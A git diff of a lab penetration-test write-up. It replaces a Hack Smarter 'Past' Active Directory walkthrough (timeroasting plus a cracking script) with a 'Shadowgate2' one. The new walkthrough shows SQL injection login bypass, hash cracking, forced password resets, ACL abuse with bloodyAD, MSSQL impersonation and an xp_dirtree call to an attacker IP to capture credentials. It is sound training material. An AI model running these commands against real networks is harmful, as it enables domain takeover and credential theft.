@@ -1,558 +1,921 @@
 ---
-title: "Hacksmarter: Past"
-description: "From user to Domain admins."
-sidebarTitle: "HSM: Past"
+title: "Hacksmarter: Shadowgate2"
+sidebarTitle: "HSM: Shadowgate2"
+description: "One-liner about the box and what you learned."
 tag: "MEDIUM"
-mode: "default"
 ---
 
 <Frame>
-  ![Past](/images/past.png "Past")
+  ![Shadowgate](/images/shadowgate-1.png "Shadowgate")
 </Frame>
 
 ## Objective
 
-<Warning>
-  You have been hired by Hack Smarter to perform a Penetration Test on Past Systems Inc. During your call with the client, they stated they are currently adding new machines to the network.
+ShadowGate provides cybersecurity solutions for global enterprises. They are in the process of getting SOC 2 certified, and have hired Hack Smarter to perform an internal network penetration test. Find all vulnerabilities and, if possible, elevate your privileges to Domain Admin. Initial Access
 
-  The client has provided you with VPN access to their internal network, but no credentials.
-</Warning>
-
-## Initial Access
-
-The client has provided you with VPN access to their internal network, but no credentials.
+You have been provided with VPN access to their network, but no other information.
 
 # Enumeration
 
 Document all enumeration don on the host to find vulnerable and attack paths
 
-```shellscript expandable
-nmap -sCV -p- -Pn --min-rate=200 10.0.20.184 -T4
-Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-01 11:11 EDT
-Nmap scan report for 10.0.20.184
-Host is up (0.017s latency).
-Not shown: 65510 filtered tcp ports (no-response)
+```bash expandable
+nmap -Pn -sCV -sC -p- --min-rate=200 10.0.30.30 -T4 
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-02 23:17 -0400
+Nmap scan report for 10.0.30.30
+Host is up (0.016s latency).
+Not shown: 65511 filtered tcp ports (no-response)
 PORT      STATE SERVICE       VERSION
 53/tcp    open  domain        Simple DNS Plus
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-01 15:18:52Z)
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: ShadowGate | Advanced Cyber Security Solutions
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-02 23:06:52Z)
 135/tcp   open  msrpc         Microsoft Windows RPC
 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: past.local, Site: Default-First-Site-Name)
-445/tcp   open  microsoft-ds  Windows Server 2016 Datacenter 14393 microsoft-ds (workgroup: PAST)
-464/tcp   open  kpasswd5?
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadowgate.local, Site: Default-First-Site-Name)
+|_ssl-date: 2026-08-02T23:08:30+00:00; -4h14m15s from scanner time.
+| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:SG-DC01.shadowgate.local
+| Not valid before: 2025-12-07T17:46:45
+|_Not valid after:  2026-12-07T17:46:45
+445/tcp   open  microsoft-ds?
 593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  tcpwrapped
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: past.local, Site: Default-First-Site-Name)
-3269/tcp  open  tcpwrapped
+1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info: 
+|   10.0.30.30:1433: 
+|     Target_Name: SHADOWGATE
+|     NetBIOS_Domain_Name: SHADOWGATE
+|     NetBIOS_Computer_Name: SG-DC01
+|     DNS_Domain_Name: shadowgate.local
+|     DNS_Computer_Name: SG-DC01.shadowgate.local
+|     DNS_Tree_Name: shadowgate.local
+|_    Product_Version: 10.0.17763
+| ms-sql-info: 
+|   10.0.30.30:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+|_ssl-date: 2026-08-02T23:08:30+00:00; -4h14m15s from scanner time.
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2026-08-02T23:03:18
+|_Not valid after:  2056-08-02T23:03:18
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadowgate.local, Site: Default-First-Site-Name)
+|_ssl-date: 2026-08-02T23:08:30+00:00; -4h14m15s from scanner time.
+| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:SG-DC01.shadowgate.local
+| Not valid before: 2025-12-07T17:46:45
+|_Not valid after:  2026-12-07T17:46:45
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shadowgate.local, Site: Default-First-Site-Name)
+|_ssl-date: 2026-08-02T23:08:31+00:00; -4h14m15s from scanner time.
+| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:SG-DC01.shadowgate.local
+| Not valid before: 2025-12-07T17:46:45
+|_Not valid after:  2026-12-07T17:46:45
 3389/tcp  open  ms-wbt-server Microsoft Terminal Services
-| rdp-ntlm-info:
-|   Target_Name: PAST
-|   NetBIOS_Domain_Name: PAST
-|   NetBIOS_Computer_Name: EC2AMAZ-A5O4OL8
-|   DNS_Domain_Name: past.local
-|   DNS_Computer_Name: EC2AMAZ-A5O4OL8.past.local
-|   Product_Version: 10.0.14393
-|_  System_Time: 2026-08-01T15:19:41+00:00
-|_ssl-date: 2026-08-01T15:20:21+00:00; 0s from scanner time.
-| ssl-cert: Subject: commonName=EC2AMAZ-A5O4OL8.past.local
-| Not valid before: 2026-07-31T15:09:52
-|_Not valid after:  2027-01-30T15:09:52
+|_ssl-date: 2026-08-02T23:08:30+00:00; -4h14m15s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: SHADOWGATE
+|   NetBIOS_Domain_Name: SHADOWGATE
+|   NetBIOS_Computer_Name: SG-DC01
+|   DNS_Domain_Name: shadowgate.local
+|   DNS_Computer_Name: SG-DC01.shadowgate.local
+|   DNS_Tree_Name: shadowgate.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2026-08-02T23:07:46+00:00
+| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
+| Not valid before: 2026-07-18T09:38:28
+|_Not valid after:  2027-01-17T09:38:28
 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-title: Not Found
 |_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
 9389/tcp  open  mc-nmf        .NET Message Framing
-47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
 49664/tcp open  msrpc         Microsoft Windows RPC
 49665/tcp open  msrpc         Microsoft Windows RPC
 49666/tcp open  msrpc         Microsoft Windows RPC
 49668/tcp open  msrpc         Microsoft Windows RPC
-49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-49673/tcp open  msrpc         Microsoft Windows RPC
-49674/tcp open  msrpc         Microsoft Windows RPC
-49675/tcp open  msrpc         Microsoft Windows RPC
-49703/tcp open  msrpc         Microsoft Windows RPC
-55445/tcp open  msrpc         Microsoft Windows RPC
-Service Info: Host: EC2AMAZ-A5O4OL8; OS: Windows; CPE: cpe:/o:microsoft:windows
+49670/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  msrpc         Microsoft Windows RPC
+49678/tcp open  msrpc         Microsoft Windows RPC
+49694/tcp open  msrpc         Microsoft Windows RPC
+49699/tcp open  msrpc         Microsoft Windows RPC
+49738/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: SG-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
-| smb2-security-mode:
-|   3:1:1:
+| smb2-time: 
+|   date: 2026-08-02T23:07:50
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
 |_    Message signing enabled and required
-| smb-os-discovery:
-|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)
-|   Computer name: EC2AMAZ-A5O4OL8
-|   NetBIOS computer name: EC2AMAZ-A5O4OL8\x00
-|   Domain name: past.local
-|   Forest name: past.local
-|   FQDN: EC2AMAZ-A5O4OL8.past.local
-|_  System time: 2026-08-01T15:19:42+00:00
-| smb2-time:
-|   date: 2026-08-01T15:19:43
-|_  start_date: 2026-08-01T15:09:55
-| smb-security-mode:
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: required
+|_clock-skew: mean: -4h14m16s, deviation: 2s, median: -4h14m15s
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 538.31 seconds
+Nmap done: 1 IP address (1 host up) scanned in 335.52 seconds
 ```
+
+<Frame>
+  ![Image](/images/image-28.png "Image")
+</Frame>
 
 ```shellscript
-impacket-smbclient past.local/'Anonymous':''@10.0.20.184
-Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
-
-Password:
-Type help for list of commands
-# shares
-ADMIN$
-C$
-IPC$
-NETLOGON
-Share
-SYSVOL
-# use Share
-# dir
-*** Unknown syntax: dir
-# ls
-drw-rw-rw-          0  Fri Jan 23 21:04:17 2026 .
-drw-rw-rw-          0  Fri Jan 23 21:04:17 2026 ..
--rw-rw-rw-        270  Sat Jan 24 13:46:12 2026 AD_machines.txt
-# get AD_machines.txt
+gobuster vhost -u http://shadowgate.local/ -w /usr/share/wordlists/dirb/big.txt --exclude-length 334 --append-domain
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                       http://shadowgate.local/
+[+] Method:                    GET
+[+] Threads:                   10
+[+] Wordlist:                  /usr/share/wordlists/dirb/big.txt
+[+] User Agent:                gobuster/3.8.2
+[+] Timeout:                   10s
+[+] Append Domain:             true
+[+] Exclude Length:            334
+[+] Exclude Hostname Length:   false
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+dev.shadowgate.local Status: 200 [Size: 14924]
+Progress: 20469 / 20469 (100.00%)
+===============================================================
+Finished
+===============================================================
 ```
 
-```shellscript
-cat AD_machines.txt
+Add `dev.shadowgate.local` to `/etc/hosts` file
 
-Name            DNSHostName
-----            -----------
-EC2AMAZ-A5O4OL8 EC2AMAZ-A5O4OL8.past.local
-APPDEV01
-WEBDEV01
-DEV01
+<Frame>
+  ![Image](/images/image-29.png "Image")
+</Frame>
+
+Using `Intruder` on `Burpsuite` I was able to bryte force the Login Page with SQL Injection payloads.
+
+![Image](/images/image-30.png "Image")
+
+Using the `'OR 1=1--'` SQL Injection payload I was able to login as the `mitch.r` user.
+
+![Image](/images/image-31.png "Image")
+
+![Image](/images/image-32.png "Image")
+
+![Image](/images/image-33.png "Image")
+
+```bash
+john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt mitch.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+snitch1993       (mitch.r)     
+1g 0:00:00:02 DONE (2026-08-03 00:59) 0.4975g/s 1823Kp/s 1823Kc/s 1823KC/s snoedrop..snickers49
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
 ```
 
-Add it to my `/etc/hosts` file.
+```bash
+nxc smb 10.0.30.30 -u 'mitch.r' -p 'snitch1993'       
+SMB         10.0.30.30      445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.30.30      445    SG-DC01          [+] shadowgate.local\mitch.r:snitch1993 
 
-```shellscript
-nxc smb 10.0.20.184 -u '' -p '' -M timeroast
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  [*] Windows Server 2016 Datacenter 14393 x64 (name:EC2AMAZ-A5O4OL8) (domain:past.local) (signing:True) (SMBv1:True) (Null Auth:True)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  [+] past.local\:
-TIMEROAST   10.0.20.184     445    EC2AMAZ-A5O4OL8  [*] Starting Timeroasting...
-TIMEROAST   10.0.20.184     445    EC2AMAZ-A5O4OL8  1009:$sntp-ms$c6f3015a16a4e2608588c99f6bfc0138$1c0111e900000000000a02ba4c4f434cee18d280838ce2d1e1b8428bffbfcd0aee18d6198bbde177ee18d6198bbe1071
-TIMEROAST   10.0.20.184     445    EC2AMAZ-A5O4OL8  1116:$sntp-ms$e80eee1653231a2d1cf27228049876cd$1c0111e900000000000a02bb4c4f434cee18d2808419a9f5e1b8428bffbfcd0aee18d61a3852f499ee18d61a38530205
-TIMEROAST   10.0.20.184     445    EC2AMAZ-A5O4OL8  1115:$sntp-ms$7616528babf42407d405680210759dc3$1c0111e900000000000a02bb4c4f434cee18d2808418c777e1b8428bffbfcd0aee18d61a3851f08dee18d61a38521f87
-TIMEROAST   10.0.20.184     445    EC2AMAZ-A5O4OL8  1117:$sntp-ms$8a59f79a41408de9a0704aafd44ff9cc$1c0111e900000000000a02bb4c4f434cee18d280828dc11ee1b8428bffbfcd0aee18d61a3a9df97aee18d61a3a9e236c
+➜  Shadowgate2 nxc smb 10.0.30.30 -u 'mitch.r' -p 'snitch1993' --shares
+SMB         10.0.30.30      445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.30.30      445    SG-DC01          [+] shadowgate.local\mitch.r:snitch1993 
+SMB         10.0.30.30      445    SG-DC01          [*] Enumerated shares
+SMB         10.0.30.30      445    SG-DC01          Share           Permissions            Remark
+SMB         10.0.30.30      445    SG-DC01          -----           -----------            ------
+SMB         10.0.30.30      445    SG-DC01          ADMIN$                                 Remote Admin
+SMB         10.0.30.30      445    SG-DC01          C$                                     Default share
+SMB         10.0.30.30      445    SG-DC01          dev$            READ,WRITE             
+SMB         10.0.30.30      445    SG-DC01          IPC$            READ                   Remote IPC
+SMB         10.0.30.30      445    SG-DC01          NETLOGON        READ                   Logon server share 
+SMB         10.0.30.30      445    SG-DC01          SYSVOL          READ                   Logon server share
 ```
 
-<iframe src="https://tldrbins.github.io/time_roasting/" height="300" width="900" title="time-roasting" />
+### Bloodhound
 
-```python expandable
-#!/usr/bin/env python3
-
-"""Perform a simple dictionary attack against the output of timeroast.py. Neccessary because the NTP 'hash' format 
-unfortunately does not fit into Hashcat or John right now.
-
-Not even remotely optimized, but still useful for cracking legacy default passwords (where the password is the computer 
-name) or specific default passwords that are popular in an organisation.
-"""
-
-from binascii import hexlify, unhexlify
-from argparse import ArgumentParser, FileType, RawDescriptionHelpFormatter
-from typing import TextIO, Generator, Tuple
-import hashlib, sys, re
-
-HASH_FORMAT = r'^(?P<rid>\d+):\$sntp-ms\$(?P<hashval>[0-9a-f]{32})\$(?P<salt>[0-9a-f]{96})$'
-
-def md4(data : bytes) -> bytes:
-  try:
-    return hashlib.new('md4', data).digest()
-  except ValueError:
-
-    from md4 import MD4
-    return MD4(data).bytes()
-
-def compute_hash(password : str, salt : bytes) -> bytes:
-  """Compute a legacy NTP authenticator 'hash'."""
-  return hashlib.md5(md4(password.encode('utf-16le')) + salt).digest()
-    
-
-def try_crack(hashfile : TextIO, dictfile : TextIO) -> Generator[Tuple[int, str], None, None]:
-
-  hashes = []
-  for line in hashfile:
-    line = line.strip()
-    if line:
-      m = re.match(HASH_FORMAT, line)
-      if not m:
-        print(f'ERROR: invalid hash format: {line}', file=sys.stderr)
-        sys.exit(1)
-      rid, hashval, salt = m.group('rid', 'hashval', 'salt')
-      hashes.append((int(rid), unhexlify(hashval), unhexlify(salt)))
-  
-  for password in dictfile:
-    password = password.strip().decode(errors='ignore')
-    for rid, hashval, salt in hashes:
-      if compute_hash(password, salt) == hashval:
-        yield rid, password
-
-def main():
-  argparser = ArgumentParser(formatter_class=RawDescriptionHelpFormatter, description=\
-"""Perform a simple dictionary attack against the output of timeroast.py.
-
-Not even remotely optimized, but still useful for cracking legacy default 
-passwords (where the password is the computer name) or specific default 
-passwords that are popular in an organisation.
-""")
-
-  argparser.add_argument('hashes', type=FileType('r'), help='Output of timeroast.py')
-  argparser.add_argument('dictionary', type=FileType('rb'), help='Line-delimited password dictionary')
-  args = argparser.parse_args()
-
-  crackcount = 0
-  for rid, password in try_crack(args.hashes, args.dictionary):
-    print(f'[+] Cracked RID {rid} password: {password}')
-    crackcount += 1
-
-  print(f'\n{crackcount} passwords recovered.')
-
-if __name__ == '__main__':
-  main()
+```bash
+bloodyad --host 10.0.30.30 -d shadowgate.local -u mitch.r -p 'snitch1993' get bloodhound
+[+] Connecting to LDAP server
+[+] Connected to LDAP serrver
+Dumping schema: 2it [00:00, 30.91it/s]
+Generating lookuptable: 86it [00:00, 376.29it/s]
+Dumping SDs: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████| 90/90 [00:01<00:00, 55.19it/s]
+Dumping domains: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 15.34it/s]
+Dumping users: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████| 10/10 [00:00<00:00, 338.46it/s]
+Dumping computers: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 44.35it/s]
+Dumping groups: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████| 52/52 [00:00<00:00, 1075.65it/s]
+Dumping GPOs: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████| 2/2 [00:00<00:00, 111.89it/s]
+Dumping OUs: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 54.49it/s]
+Dumping Containers: 100%|███████████████████████████████████████████████████████████████████████████████████████████████| 19/19 [00:00<00:00, 364.64it/s]
+[+] Bloodhound data saved to 20260803T050746_Bloodhound.zip
+[+] Found 0 trusts
 ```
 
-```text
-python3 timecrack.py sntp.hash /usr/share/wordlists/rockyou.txt
-[+] Cracked RID 1115 password: P@ssw0rd!
+`mitch.r` has both `ForceChangePassword` on both `milo.w` and `ryan.j`. Milo.w is a better attack path because he also has aan `outbound Object Control` over the `svc_mssql` user
 
-1 passwords recovered.
+<Frame>
+  ![Image](/images/image-34.png "Image")
+</Frame>
+
+```bash
+net rpc password "milo.w" "newP@ssword2022" -U "shadowgate.local"/"mitch.r"%"snitch1993" -S "10.0.30.30"
+
+ 
+➜  Shadowgate2 nxc smb 10.0.30.30 -u 'milo.w' -p 'newP@ssword2022'
+SMB         10.0.30.30      445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.30.30      445    SG-DC01          [+] shadowgate.local\milo.w:newP@ssword2022
 ```
+
+<Frame>
+  ![Image](/images/image-35.png "Image")
+</Frame>
+
+```bash
+bloodyad --host 10.0.30.30 -d shadowgate.local -u milo.w -p 'newP@ssword2022' set owner svc_mssql 'milo.w'        
+[+] Old owner S-1-5-21-2396436576-3267128377-3646372360-512 is now replaced by milo.w on svc_mssql
+
+# Give milo.w GenericAll Rights
+bloodyad --host 10.0.30.30 -d shadowgate.local -u milo.w -p 'newP@ssword2022' add genericAll 'svc_mssql' 'milo.w'
+[+] milo.w has now GenericAll on svc_mssql
+
+# Change SVC_MSSQL password
+bloodyad --host 10.0.30.30 -d shadowgate.local -u milo.w -p 'newP@ssword2022' set password 'svc_mssql' 'Valentino1@'
+[+] Password changed successfully!
+```
+
+### MSSQL Impersonation
+
+```bash
+nxc mssql 10.0.30.30 -u 'svc_mssql' -p 'Valentino1@' -M mssql_priv            
+MSSQL       10.0.30.30      1433   SG-DC01          [*] Windows 10 / Server 2019 Build 17763 (name:SG-DC01) (domain:shadowgate.local) (EncryptionReq:False) 
+MSSQL       10.0.30.30      1433   SG-DC01          [+] shadowgate.local\svc_mssql:Valentino1@ 
+MSSQL_PRIV  10.0.30.30      1433   SG-DC01          [*] SHADOWGATE\svc_mssql can impersonate: SHADOWGATE\bogdan.r
+```
+
+Using `impacket-mssqlclient` it also shows `svc_mssql` can impersonate `bogdan.r`.
 
 ```shellscript expandable
-nxc smb 10.0.20.184 -u 'a' -p '' --rid-brute
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  [*] Windows Server 2016 Datacenter 14393 x64 (name:EC2AMAZ-A5O4OL8) (domain:past.local) (signing:True) (SMBv1:True) (Null Auth:True)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  [+] past.local\a: (Guest)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  498: PAST\Enterprise Read-only Domain Controllers (SidTypeGroup)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  500: PAST\Administrator (SidTypeUser)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  501: PAST\Guest (SidTypeUser)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  502: PAST\krbtgt (SidTypeUser)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  503: PAST\DefaultAccount (SidTypeUser)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  512: PAST\Domain Admins (SidTypeGroup)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  513: PAST\Domain Users (SidTypeGroup)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  514: PAST\Domain Guests (SidTypeGroup)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  515: PAST\Domain Computers (SidTypeGroup)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  516: PAST\Domain Controllers (SidTypeGroup)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  517: PAST\Cert Publishers (SidTypeAlias)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  518: PAST\Schema Admins (SidTypeGroup)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  519: PAST\Enterprise Admins (SidTypeGroup)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  520: PAST\Group Policy Creator Owners (SidTypeGroup)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  521: PAST\Read-only Domain Controllers (SidTypeGroup)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  522: PAST\Cloneable Domain Controllers (SidTypeGroup)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  525: PAST\Protected Users (SidTypeGroup)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  526: PAST\Key Admins (SidTypeGroup)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  527: PAST\Enterprise Key Admins (SidTypeGroup)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  553: PAST\RAS and IAS Servers (SidTypeAlias)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  571: PAST\Allowed RODC Password Replication Group (SidTypeAlias)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  572: PAST\Denied RODC Password Replication Group (SidTypeAlias)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  1008: PAST\tyler (SidTypeUser)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  1009: PAST\EC2AMAZ-A5O4OL8$ (SidTypeUser)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  1110: PAST\DnsAdmins (SidTypeAlias)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  1111: PAST\DnsUpdateProxy (SidTypeGroup)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  1115: PAST\APPDEV01$ (SidTypeUser)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  1116: PAST\WEBDEV01$ (SidTypeUser)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  1117: PAST\DEV01$ (SidTypeUser)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  1121: PAST\ryan (SidTypeUser)
+impacket-mssqlclient shadowgate/svc_mssql:'Valentino1@'@10.0.30.30 -windows-auth
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(SG-DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(SG-DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
+[!] Press help for extra shell commands
+SQL (SHADOWGATE\svc_mssql  guest@master)> help
+
+    lcd {path}                 - changes the current local directory to {path}
+    exit                       - terminates the server process (and this session)
+    enable_xp_cmdshell         - you know what it means
+    disable_xp_cmdshell        - you know what it means
+    enum_db                    - enum databases
+    enum_links                 - enum linked servers
+    enum_impersonate           - check logins that can be impersonated
+    enum_logins                - enum login users
+    enum_users                 - enum current db users
+    enum_owner                 - enum db owner
+    exec_as_user {user}        - impersonate with execute as user
+    exec_as_login {login}      - impersonate with execute as login
+    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+    xp_dirtree {path}          - executes xp_dirtree on the path
+    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
+    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
+    ! {cmd}                    - executes a local shell cmd
+    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
+    download {from} {to}       - downloads file from the SQLServer host {from} to {to}
+    show_query                 - show query
+    mask_query                 - mask query
+    
+SQL (SHADOWGATE\svc_mssql  guest@master)> enum_impersonate
+execute as   database   permission_name   state_desc   grantee                grantor               
+----------   --------   ---------------   ----------   --------------------   -------------------   
+b'LOGIN'     b''        IMPERSONATE       GRANT        SHADOWGATE\svc_mssql   SHADOWGATE\bogdan.r   
+SQL (SHADOWGATE\svc_mssql  guest@master)> 
 ```
 
-```text
-1115: PAST\APPDEV01$ (SidTypeUser): P@ssw0rd!
+```bash
+SQL (SHADOWGATE\bogdan.r  guest@master)> xp_dirtree //10.200.76.171/shares
+subdirectory   depth   file   
+------------   -----   ----   
+SQL (SHADOWGATE\bogdan.r  guest@master)> 
 ```
 
-```shellscript
-nxc smb 10.0.20.184 -u 'APPDEV01$' -p 'P@ssw0rd!' --users
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  [*] Windows Server 2016 Datacenter 14393 x64 (name:EC2AMAZ-A5O4OL8) (domain:past.local) (signing:True) (SMBv1:True) (Null Auth:True)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  [+] past.local\APPDEV01$:P@ssw0rd!
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  -Username-                    -Last PW Set-       -BadPW- -Description-
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  Administrator                 2026-01-24 19:22:42 0       Built-in account for administering the computer/domain
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  Guest                         <never>             0       Built-in account for guest access to the computer/domain
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  krbtgt                        2026-01-23 21:35:10 0       Key Distribution Center Service Account
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  DefaultAccount                <never>             0       A user account managed by the system.
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  tyler                         2026-01-24 02:05:55 0
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  ryan                          2026-01-24 19:24:46 0
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  [*] Enumerated 6 local users: PAST
-```
+![Image](/images/image-36.png "Image")
 
-```shellscript
-nxc smb 10.0.20.184 -u 'APPDEV01$' -p 'P@ssw0rd!' --shares
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  [*] Windows Server 2016 Datacenter 14393 x64 (name:EC2AMAZ-A5O4OL8) (domain:past.local) (signing:True) (SMBv1:True) (Null Auth:True)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  [+] past.local\APPDEV01$:P@ssw0rd!
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  [*] Enumerated shares
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  Share           Permissions     Remark
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  -----           -----------     ------
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  ADMIN$                          Remote Admin
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  C$                              Default share
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  IPC$            READ            Remote IPC
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  NETLOGON        READ            Logon server share
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  Share           READ
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  SYSVOL          READ            Logon server share
-```
-
-```shellscript
-impacket-smbclient past.local/'APPDEV01$':'P@ssw0rd!'@10.0.20.184
-Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
-
-Type help for list of commands
-# shares
-ADMIN$
-C$
-IPC$
-NETLOGON
-Share
-SYSVOL
-# use SYSVOL
-# ls
-drw-rw-rw-          0  Fri Jan 23 16:33:21 2026 .
-drw-rw-rw-          0  Fri Jan 23 16:33:21 2026 ..
